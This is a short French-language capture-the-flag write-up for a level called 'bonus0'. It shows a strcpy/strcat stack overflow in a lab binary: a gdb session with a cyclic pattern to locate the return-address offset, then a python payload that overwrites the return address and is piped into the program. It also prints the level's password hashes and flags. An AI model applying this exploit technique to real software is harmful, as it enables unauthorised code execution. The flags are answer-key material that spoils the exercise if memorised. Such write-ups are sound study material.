# Bonus 0
```bash
su bonus0 #f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```

## Steps
Le programe prends 2 gets en entree mais verifie la taille des strings copiees. Seulement ici, un appel a strcpy et surtout `strcat` nous permet d'exploiter une faille. Les 2 buffers sont stockes a cote. En ometant un \0 sur le premier buffer, nous pouvons faire penser au strcat que la premiere str est en realite plus longue. 
Pour passer au deuxieme read, on injectera 4096 caracteres. Il ne faut pas oublier de mettre le `\n` et ne pas mettre de `\0`.
 On utilisera un overflow pattern en deuxieme argument pour reperer l'adresse de RET.

```bash
(gdb) r
Starting program: /home/user/bonus0/bonus0
 -
01234567890123456789
 -
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
01234567890123456789Aa0Aa1Aa2Aa3Aa4Aa5Aa�� Aa0Aa1Aa2Aa3Aa4Aa5Aa��

Program received signal SIGSEGV, Segmentation fault.
0x41336141 in ?? ()
```

On est donc a l'offset 9, il nous suffit rde remplacer cet offset par une addresse de retour

```bash
python -c "print '0' *4095 + '\n' + 'Aa0Aa1Aa2' + '\xbf\xff\xf8\xa6'[::-1] + 'a4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag'"> /tmp/b0.
cat /tmp/b0 - | ./bonus0
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```
